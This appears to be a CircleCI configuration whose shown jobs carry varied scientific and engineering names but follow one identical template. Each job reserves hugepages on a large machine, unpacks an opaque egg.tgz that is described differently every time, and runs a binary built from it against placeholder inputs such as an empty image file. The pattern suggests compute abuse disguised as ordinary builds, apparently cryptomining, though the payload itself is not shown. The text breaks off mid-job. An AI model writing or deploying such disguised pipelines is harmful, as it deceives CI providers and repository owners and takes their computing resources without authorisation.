version: 2.1

jobs:
  tallow:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load render mix
          command: |
            printf 'fat 0.8\n' > tallow.cfg
      - run:
          name: Build candle sim
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target tallow -j2
      - run:
          name: Render tallow burn
          command: LIONSS_LP=1 ./build/tallow --config tallow.cfg --wick 2
  thruster_pwm:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set duty
          command: |
            printf 'duty 0.3\n' > thr.cfg
      - run:
          name: Build actuator driver
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target thruster_pwm -j2
      - run:
          name: Modulate thruster PWM
          command: LIONSS_LP=1 ./build/thruster_pwm --conf thr.cfg --freq 10
  denoiseNlm:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load noisy image
          command: |
            : > img.png
      - run:
          name: Build denoiser
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target denoiseNlm -j2
      - run:
          name: Non-local means denoise
          command: LIONSS_LP=1 ./build/denoiseNlm --in img.png --h 10
  driftwood:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Snapshot schema
          command: |
            printf 'v = 7\n' > schema.ver
      - run:
          name: Build migrator
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target driftwood -j2
      - run:
          name: Apply driftwood migrations
          command: LIONSS_LP=1 ./build/driftwood --from 6 --to 7
  dft-relax:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Place atoms
          command: |
            printf 'H 0 0 0\nH 0 0 0.74\n' > mol.xyz
      - run:
          name: Build SCF solver
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target dft-relax -j2
      - run:
          name: Relax geometry
          command: LIONSS_LP=1 ./build/dft-relax --xyz mol.xyz --functional pbe
  urdf_validate:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write robot model
          command: |
            printf '<robot name=arm></robot>\n' > arm.urdf
      - run:
          name: Build model parser
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target urdf_validate -j2
      - run:
          name: Validate URDF tree
          command: LIONSS_LP=1 ./build/urdf_validate --urdf arm.urdf --check-inertia
  quartzvale:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore build cache
          command: tar xzf egg.tgz
      - run:
          name: Install build tools
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load strata
          command: |
            printf 'veins 7\n' > quartz.cfg
      - run:
          name: Build geology sim
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target quartzvale -j2
      - run:
          name: Survey quartzvale
          command: LIONSS_LP=1 ./build/quartzvale --config quartz.cfg --grid 50
  LorawanAdr:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Pull reference data
